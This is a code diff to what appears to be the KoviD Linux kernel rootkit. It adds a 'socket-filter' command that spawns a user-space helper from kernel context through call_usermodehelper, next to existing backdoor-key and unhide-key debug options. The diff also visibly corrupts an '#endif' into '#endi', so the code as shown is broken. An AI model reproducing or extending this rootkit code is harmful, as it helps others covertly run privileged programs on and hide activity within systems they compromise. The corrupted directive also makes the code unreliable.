@@ -452,7 +452,7 @@ enum {
 	Opt_get_bdkey,
 	Opt_get_unhidekey,
 #endif
-
+	Opt_socket_filter,
 };
 
 static const match_table_t tokens = {
@@ -476,7 +476,8 @@ static const match_table_t tokens = {
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
-#endif
+#endi
+	{ Opt_socket_filter, "socket-filter" },
 	{ Opt_unknown, NULL }
 };
 
@@ -630,6 +631,26 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				base = kv_get_elf_vm_start(pid);
 				snprintf(bits, 32, "%lx", base);
 				set_elfbits(bits);
+			}
+		} break;
+		case Opt_socket_filter: {
+			static char *argv[] = { "socket_filter", NULL };
+			static char *envp[] = {
+				"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+				NULL
+			};
+
+			pr_info("KoviD: Launching socket_filter_user via call_usermodehelper.\n");
+
+			/*
+			 * Use UMH_WAIT_PROC if you want to block until the user-space program
+			 * finishes. UMH_NO_WAIT just spawns it and returns immediately.
+			 */
+			int ret = call_usermodehelper(argv[0], argv, envp,
+						      UMH_NO_WAIT);
+			if (ret < 0) {
+				pr_err("KoviD: Failed to run socket_filter_user, ret=%d\n",
+				       ret);
 			}
 		} break;
 		default:
